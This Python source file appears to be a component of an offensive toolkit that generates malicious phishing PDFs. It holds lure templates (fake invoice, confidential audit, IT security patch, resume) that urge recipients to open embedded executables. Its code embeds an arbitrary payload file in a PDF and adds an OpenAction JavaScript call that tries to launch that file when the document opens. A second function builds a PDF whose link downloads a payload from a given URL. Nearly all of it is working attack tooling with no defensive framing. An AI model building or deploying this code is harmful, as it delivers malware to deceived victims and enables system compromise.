import os
import random
import datetime
import subprocess
import shutil
import tempfile

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
OUTPUT_DIR = os.path.join(ROOT, "output")

LURE_TEMPLATES = {
    "1": {
        "title": "INVOICE",
        "subject": "Invoice #: INV-2024-{rand}",
        "lines": [
            ("heading", "INVOICE"),
            ("spacer", None),
            ("normal", "Invoice #: INV-2024-{rand}"),
            ("normal", "Date: {date}"),
            ("spacer", None),
            ("normal", "Bill To: Valued Customer"),
            ("normal", "Description: Premium Service Package"),
            ("normal", "Amount Due: $1,249.99"),
            ("spacer", None),
            ("normal", "Please download the attached document to view your invoice."),
            ("normal", "This document requires Adobe Reader to view properly."),
            ("normal", "Click the attachment icon (paperclip) to open the required file."),
            ("spacer", None),
            ("small", "NOTE: If you are using a web browser, save this file and open it"),
            ("small", "in Adobe Reader DC for the best experience.")
        ]
    },
    "2": {
        "title": "CONFIDENTIAL REPORT",
        "subject": "Internal Audit - Q3 2024",
        "lines": [
            ("heading", "CONFIDENTIAL"),
            ("spacer", None),
            ("normal", "Internal Audit Report - Q3 2024"),
            ("normal", "Classification: Restricted"),
            ("normal", "To: Management Team"),
            ("spacer", None),
            ("normal", "Please find attached the quarterly performance analysis."),
            ("normal", "This document is encrypted for your security."),
            ("normal", "Open with Adobe Reader to decrypt and view content."),
            ("normal", "Click the paperclip icon and open 'report_viewer.exe'."),
            ("spacer", None),
            ("small", "Authorized personnel only. Unauthorized access is prohibited.")
        ]
    },
    "3": {
        "title": "SECURITY UPDATE",
        "subject": "Critical Security Patch Required",
        "lines": [
            ("heading", "IMPORTANT SECURITY NOTICE"),
            ("spacer", None),
            ("normal", "A critical security update is required for your system."),
            ("normal", "Your IT department has issued this mandatory patch."),
            ("spacer", None),
            ("normal", "Please open the attached 'security_patch.exe' file to apply the update."),
            ("normal", "Failure to install this update may result in system"),
            ("normal", "vulnerabilities and compliance violations."),
            ("spacer", None),
            ("small", "IT Security Department"),
            ("small", "This is an automated message. Do not reply.")
        ]
    },
    "4": {
        "title": "RESUME",
        "subject": "Job Application - Senior Position",
        "lines": [
            ("heading", "Job Application"),
            ("spacer", None),
            ("normal", "Position: Senior Software Engineer"),
            ("normal", "Applicant: John Doe"),
            ("spacer", None),
            ("normal", "Dear Hiring Manager,"),
            ("spacer", None),
            ("normal", "Please find my resume and portfolio attached."),
            ("normal", "Open the attached 'resume_viewer.exe' to view my full profile."),
            ("spacer", None),
            ("normal", "I look forward to discussing how my experience"),
            ("normal", "can contribute to your team."),
            ("spacer", None),
            ("small", "Best regards,"),
            ("small", "John Doe | john.doe@email.com")
        ]
    }
}

def _fmt(template_id):
    rand_str = str(random.randint(1000, 9999))
    date_str = datetime.datetime.now().strftime("%B %d, %Y")
    t = LURE_TEMPLATES[template_id]
    result = []
    for line_type, content in t["lines"]:
        if content:
            content = content.replace("{rand}", rand_str).replace("{date}", date_str)
        result.append((line_type, content))
    return t["title"], t["subject"], result


def generate_lure_pdf(output_path, template_id="1"):
    try:
        from reportlab.lib.pagesizes import A4
        from reportlab.lib.units import mm
        from reportlab.lib.colors import HexColor
        from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer
        from reportlab.lib.styles import ParagraphStyle
    except ImportError:
        print("[x] reportlab not installed. Run: pip install reportlab")
        return None

    os.makedirs(os.path.dirname(output_path) or ".", exist_ok=True)

    title, subject, lines = _fmt(template_id)

    doc = SimpleDocTemplate(
        output_path, pagesize=A4,
        topMargin=25*mm, bottomMargin=20*mm,
        leftMargin=25*mm, rightMargin=20*mm
    )

    sty = {
        "heading": ParagraphStyle("h", fontSize=20, textColor=HexColor("#1a237e"), spaceAfter=12, leading=26),
        "normal": ParagraphStyle("n", fontSize=11, leading=16, spaceAfter=4),
        "small": ParagraphStyle("s", fontSize=9, textColor=HexColor("#555555"), leading=13, spaceAfter=2),
    }

    elements = []
    for lt, c in lines:
        if lt == "spacer":
            elements.append(Spacer(1, 6*mm))
        elif lt in sty and c:
            elements.append(Paragraph(c.replace("\n", "<br/>"), sty[lt]))

    # Add a footer note about attachments
    elements.append(Spacer(1, 12*mm))
    elements.append(Paragraph(
        "This document contains embedded files. Click the attachment icon (paperclip)<br/>"
        "in the navigation pane and open the attached file to view full content.",
        ParagraphStyle("f", fontSize=8, textColor=HexColor("#999999"), leading=10)
    ))

    doc.build(elements)
    return output_path


def embed_file_in_pdf(pdf_path, file_to_embed, embed_name=None):
    if embed_name is None:
        embed_name = os.path.basename(file_to_embed)

    # Try using mutool (mupdf-tools) or pdfattach first
    tools = [
        ("mutool", ["mutool", "embed", pdf_path, file_to_embed, embed_name, pdf_path]),
        ("pdfattach", ["pdfattach", file_to_embed, pdf_path, pdf_path]),
    ]

    for tool_name, cmd in tools:
        if shutil.which(tool_name):
            try:
                result = subprocess.run(cmd, capture_output=True, text=True)
                if result.returncode == 0:
                    return pdf_path
            except:
                continue

    # Fallback: manual PDF injection
    # Uses a simpler approach - create a new PDF wrapper around the payload
    # This creates a PDF with the payload as an embedded file
    return _manual_pdf_with_attachment(pdf_path, file_to_embed, embed_name)


def _manual_pdf_with_attachment(pdf_path, file_to_embed, embed_name):
    """Create a new PDF that embeds the payload file using manual PDF construction."""
    with open(pdf_path, "rb") as f:
        lure_data = f.read()

    with open(file_to_embed, "rb") as f:
        payload_data = f.read()

    import base64

    objects = []
    obj_counter = [1]

    def add_obj(body):
        num = obj_counter[0]
        obj_counter[0] += 1
        s = f"{num} 0 obj\n{body}\nendobj"
        objects.append(s)
        return num

    # Object 1: Catalog
    catalog_num = add_obj("<< /Type /Catalog /Pages 2 0 R >>")

    # Object 2: Pages
    pages_num = add_obj("<< /Type /Pages /Kids [3 0 R] /Count 1 >>")

    # Object 3: Page
    page_num = add_obj("<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>")

    # Object 4: Content stream
    stream_data = (
        b"BT /F1 24 Tf 50 700 Td (PDF Document) Tj ET\n"
        b"BT /F1 12 Tf 50 650 Td (This document contains embedded data.) Tj ET\n"
        b"BT /F1 10 Tf 50 620 Td (Please open the attachment to view the full content.) Tj ET\n"
    )
    stream_len = len(stream_data)
    content_num = add_obj(f"<< /Length {stream_len} >>\nstream\n{stream_data.decode('latin-1')}\nendstream")

    # Object 5: Font
    font_num = add_obj("<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>")

    # Object 6: Embedded file
    embed_num = add_obj(f"<< /Type /EmbeddedFile /Subtype /application#2Foctet-stream /Length {len(payload_data)} >>\nstream\n{payload_data.decode('latin-1')}\nendstream")

    # Object 7: Filespec
    filespec_num = add_obj(f"<< /Type /Filespec /F ({embed_name}) /UF ({embed_name}) /EF << /F {embed_num} 0 R >> >>")

    # Object 8: JavaScript action
    js_code = (
        f'try {{ '
        f'this.exportDataObject({{cName: "{embed_name}", nLaunch: 2}}); '
        f'}} catch(e) {{ '
        f'app.alert("Please open the attachment (paperclip icon) to view this document."); '
        f'}}'
    )
    js_num = add_obj(f"<< /Type /Action /S /JavaScript /JS ({js_code}) >>")

    # Build final PDF
    pdf_content = "%PDF-1.7\n%\xFF\xFF\xFF\xFF\n"
    for o in objects:
        pdf_content += o + "\n"

    xref_offset = len(pdf_content.encode("latin-1"))
    offsets = []
    current_pos = len("%PDF-1.7\n%\xFF\xFF\xFF\xFF\n".encode("latin-1"))
    for o in objects:
        obj_size = len(o.encode("latin-1")) + 1
        offsets.append(str(current_pos))
        current_pos += obj_size + 1

    pdf_content += "xref\n"
    pdf_content += f"0 {obj_counter[0] + 1}\n"
    pdf_content += "0000000000 65535 f \n"
    for off in offsets:
        pdf_content += f"{off.zfill(10)} 00000 n \n"

    pdf_content += "trailer\n"
    pdf_content += f"<< /Size {obj_counter[0] + 1} /Root {catalog_num} 0 R /OpenAction {js_num} 0 R /Names << /EmbeddedFiles << /Names [({embed_name}) {filespec_num} 0 R] >> >> >>\n"
    pdf_content += "startxref\n"
    pdf_content += f"{xref_offset}\n"
    pdf_content += "%%EOF"

    with open(pdf_path, "w", encoding="latin-1") as f:
        f.write(pdf_content)

    return pdf_path


def generate_custom_pdf(payload_path, lhost, lport, output_name="invoice.pdf", lure_id="1"):
    if not os.path.exists(payload_path):
        print(f"[x] Payload not found: {payload_path}")
        return None

    if lure_id not in LURE_TEMPLATES:
        print(f"[x] Invalid lure template: {lure_id}")
        return None

    os.makedirs(OUTPUT_DIR, exist_ok=True)
    output_path = os.path.join(OUTPUT_DIR, output_name)

    # Step 1: Create lure PDF
    print(f"[*] Creating lure PDF with template: {LURE_TEMPLATES[lure_id]['title']}")
    result = generate_lure_pdf(output_path, lure_id)
    if not result:
        return None

    # Step 2: Embed payload into PDF
    embed_name = os.path.basename(payload_path)
    print(f"[*] Embedding payload: {embed_name}")
    result = embed_file_in_pdf(output_path, payload_path, embed_name)
    if result:
        size_kb = os.path.getsize(output_path) / 1024
        print(f"[+] Custom PDF created: {output_path} ({size_kb:.1f} KB)")
        print(f"[*] Embedded file: {embed_name}")
        print(f"[*] Social engineering: User will be prompted to open the attachment")
        return output_path
    return None


def generate_simple_pdf_with_link(payload_url, output_name="document.pdf", lure_id="1"):
    """
    Generate a PDF that contains a clickable link to download the payload.
    This is more reliable than embedded files for modern PDF readers.
    """
    try:
        from reportlab.lib.pagesizes import A4
        from reportlab.lib.units import mm
        from reportlab.lib.colors import HexColor, blue
        from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer
        from reportlab.lib.styles import ParagraphStyle
    except ImportError:
        print("[x] reportlab not installed. Run: pip install reportlab")
        return None

    os.makedirs(OUTPUT_DIR, exist_ok=True)
    output_path = os.path.join(OUTPUT_DIR, output_name)

    title, subject, lines = _fmt(lure_id)

    doc = SimpleDocTemplate(
        output_path, pagesize=A4,
        topMargin=25*mm, bottomMargin=20*mm,
        leftMargin=25*mm, rightMargin=20*mm
    )

    sty = {
        "heading": ParagraphStyle("h", fontSize=20, textColor=HexColor("#1a237e"), spaceAfter=12, leading=26),
        "normal": ParagraphStyle("n", fontSize=11, leading=16, spaceAfter=4),
        "link": ParagraphStyle("l", fontSize=11, leading=16, textColor=blue, spaceAfter=4),
        "small": ParagraphStyle("s", fontSize=9, textColor=HexColor("#555555"), leading=13, spaceAfter=2),
    }

    elements = []
    for lt, c in lines:
        if lt == "spacer":
            elements.append(Spacer(1, 6*mm))
        elif lt in sty and c:
            elements.append(Paragraph(c.replace("\n", "<br/>"), sty[lt]))

    # Add download link
    elements.append(Spacer(1, 10*mm))
    elements.append(Paragraph(
        f'<a href="{payload_url}">Click here to download required viewer</a>',
        sty["link"]
    ))
    elements.append(Spacer(1, 6*mm))
    elements.append(Paragraph(
        "If the link does not work, copy and paste the following URL into your browser:",
        sty["small"]
    ))
    elements.append(Paragraph(
        f'<font size="8">{payload_url}</font>',
        sty["small"]
    ))

    doc.build(elements)

    size_kb = os.path.getsize(output_path) / 1024
    print(f"[+] PDF with download link created: {output_path} ({size_kb:.1f} KB)")
    print(f"[*] Payload URL: {payload_url}")
    return output_path
